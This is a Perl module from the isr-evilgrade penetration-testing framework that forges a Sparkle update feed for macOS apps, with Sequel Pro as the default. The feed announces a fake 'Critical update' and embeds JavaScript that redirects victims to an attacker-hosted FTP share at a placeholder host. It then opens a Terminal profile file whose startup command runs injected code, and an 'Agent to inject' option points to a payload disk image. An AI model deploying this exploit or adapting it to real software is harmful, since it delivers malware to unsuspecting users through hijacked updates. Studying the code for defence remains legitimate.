###############
# sparkle2.pm
#
# Copyright 2016 Matias Ariel Re Medina
#
# Info:
# https://vulnsec.com/2016/osx-apps-vulnerabilities/
# Credits to @radekk
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##

package modules::sparkle2;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'Sparkle2',
    'version'     => '1.0',
    'appver'      => 'All',
    'author'      => ['Matias Ariel Re Medina <mre[at]faradaysec[dot]com>'],
    'description' => qq{Sparkle },
    # 'vh'          => '', #(sequelpro.com)', # |adiumx.cachefly.net|download.panic.com|iterm2.com|github.com,
    'useragent' => 'true',
    'request'     => [
        {   'req'    => '.*', #match Sparkle header,
            'useragent' => 'Sparkle',
            'agent' => '',
            'type'   => 'string',                  #file|string|agent|install
            'method' => '',                      #any
            'bin'    => '',
            'string' => '<?xml version="1.0" encoding="utf-8"?>
<rss xmlns:atom="http://www.w3.org/2005/Atom"
xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle" version="2.0">
  <channel>
    <title><%APPNAME%> </title>
    <link><%APPLINK%></link>
    <description>Appcast for Sequel Pro</description>
    <language>en</language>
    <item>
      <title><%APPNAME%> <%VERSION%> (9 major bugs fixed; 6 new features)</title>
      <description><![CDATA[
      <h1 style="color: red;">Critical update available.</h1>
      <script type="text/javascript">
        window.location = \'<%FTP%>\';
        window.setTimeout(function() {
          window.location = \'<%TERMFILE%>\';
        }, 1000);
      </script>
      ]]></description>
      <pubDate><%PUBDATE%></pubDate>
      <enclosure
      url="<%APPURL%>"
      length="<%AGENTSIZE%>"
      type="application/octet-stream"
      sparkle:dsaSignature="<%DSASIG%>"
      sparkle:version="<%VERSION%>" sparkle:shortVersionString="<%SVERSION%>" />
    </item>
  </channel>
</rss>',
            'parse'  => 1,
            'file' => '',
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/osx/update.dmg',
            'desc' => 'Agent to inject'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'appname' => {
            'val' => 'Sequel Pro',
            'desc' => 'Application name.'
        },
        'applink' => {
            'val' => 'http://www.sequelpro.com',
            'desc' => 'Application link.'
        },
        'appurl' => {
            'val' => 'https://github.com/sequelpro/sequelpro/releases/download/release-1.1/sequel-pro-1.1.dmg',
            'desc' => 'Application url.'
        },
        'pubdate' => {
            'val' => 'Wed, 08 Jun 2019 19:20:11 +0000',
            'desc' => 'Release date.'
        },
        'sversion' => {
            'val' => '9.99',
            'desc' => 'App version.'
        },
        'version' => {
            'val' => '9999',
            'desc' => 'App version.'
        },
        'ftp' => {
            'val' => 'ftp://anonymous:nopass@our-fake-server.com/',
            'desc' => 'FTP server (our-fake-server.com) to host our malicious code.'
        },
        'termfile' => {
            'val' => 'file:///Volumes/our-fake-server.com/UPGRADE.terminal',
            'desc' => 'UPGRADE.terminal file is an exported setting profile from the Terminal app (Terminal -> Preferences -> Profiles). Inside the "Shell" tab of selected profile, there is a possibility to add a startup command to execute immediately after loading a profile.'
        },
        'dsasig' => {
            'val' => 'dsasig MCwCFAyXhQMU7BR1tqa8KFuXnGAooA4ZAhQtJoStAhvbfmvsaejqnWSKWZUuY==',
            'desc' => 'DSA Signature.'
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
